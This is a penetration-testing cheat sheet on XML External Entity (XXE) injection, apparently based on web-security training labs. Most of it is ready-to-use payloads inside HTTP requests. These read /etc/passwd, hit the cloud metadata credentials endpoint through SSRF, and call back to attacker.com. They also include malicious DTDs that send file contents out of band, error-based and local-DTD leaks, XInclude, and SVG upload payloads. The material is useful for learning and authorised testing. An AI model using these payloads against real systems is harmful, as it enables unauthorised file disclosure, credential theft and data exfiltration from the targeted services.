# ⭕ XML External Entity (XXE) Injection

## <mark style="color:red;">Intro</mark>

The XML document type definition (DTD) contains declarations that can define the structure of an XML document. The DTD is declared within the optional DOCTYPE element at the start of the XML document.

XXE are a type of custom XML entity whose defined values are loaded from outside of the DTD.

Allows an attacker to interfere with an application's processing of XML data.

#### <mark style="color:red;">**Examples**</mark>

* Custom entities to be defined within the DTD\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`myentity`</mark>` ``"`<mark style="color:yellow;">`my entity value`</mark>`" > ]>`&#x20;
* XML external entities\
  uses the "SYSTEM" keyword and must specify a URL\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`NAME`</mark>` ``SYSTEM "`<mark style="color:yellow;">`http://normal-website.com`</mark>`" > ]>`\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`NAME`</mark>` ``SYSTEM "`<mark style="color:yellow;">`file:///path/to/file`</mark>`" > ]>`&#x20;

## <mark style="color:red;">Types of XXE attacks</mark>

### <mark style="color:orange;">Exploiting XXE to retrieve files</mark>

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><MainTag><VulTag>&xxe;</VulTag></MainTag>
```

### <mark style="color:orange;">Exploiting XXE to perform SSRF attacks</mark>

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/admin/security-credentials"> ]><MainTag><VulTag>&ssrf;</VulTag></MainTag>
```

### <mark style="color:orange;">Blind XXE vulnerabilities</mark>

Does not return the values of any defined external entities within its responses.

```
// Edit HTTP request with "BurpSuit Proxy"
// Detecting: DNS lookup and HTTP request (with Burp Collaborator client)

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.attacker.com"> ]>]><MainTag><VulTag>&xxe;</VulTag></MainTag>
```

```
// Edit HTTP request with "BurpSuit Proxy"
// Detecting: DNS lookup and HTTP request (with Burp Collaborator client) + XML parameter entity

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.attacker.com"> %xxe; ]>
```

Use the FTP protocol instead of HTTP, it will be possible to exfiltrate data containing newline character

### <mark style="color:orange;">Exploiting blind XXE exfiltrate data out-of-band</mark>

* Attacker create a malicious DTD on his server (malicious.dtd) like:

```
// "malicious.dtd" File

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

* Attacker must submit the following XXE payload to the vulnerable application:

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]> 
```

* Use the FTP protocol instead of HTTP, it will be possible to exfiltrate data containing newline characters

## <mark style="color:red;">Exploiting blind XXE to retrieve data via error messages</mark>

<mark style="color:green;">**First method**</mark>

* Attacker create a malicious DTD on his server (malicious.dtd) like:

```
// "malicious.dtd" File

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

* Attacker must submit the following XXE payload to the vulnerable application:

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]> 
```

<mark style="color:green;">**Second method**</mark>

* Retrieve data via repurposing a local DTD

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM 
&#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
```



## <mark style="color:red;">Finding hidden attack surface for XXE injection</mark>

### <mark style="color:orange;">XInclude attacks</mark>

Some applications receive client-submitted data, embed it on the server-side into an XML document like: backend SOAP service.

"XInclude" is a part of the XML specification that allows an XML document to be built from sub-documents.

```
// Edit HTTP request with "BurpSuit Proxy"
POST /product/stock HTTP/1.1
Host: web-security-academy.net
...
Connection: close

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> &storeId=1
```

### <mark style="color:orange;">XXE attacks via file upload</mark>

If uploaded files which are then processed server-side, it can be vulnerable. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

Create a SVG image with this payload and upload it. The result will be on the image.

<pre><code><strong>&#x3C;?xml version="1.0" standalone="yes"?>&#x3C;!DOCTYPE test [ &#x3C;!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>&#x3C;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&#x3C;text font-size="16" x="0" y="16">&#x26;xxe;&#x3C;/text>&#x3C;/svg>
</strong></code></pre>

### <mark style="color:orange;">XXE attacks via modified content type</mark>

You might be able submit the following request, with the same result.

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

Server parses the body content as XML, then you can reach the hidden XXE attack surface
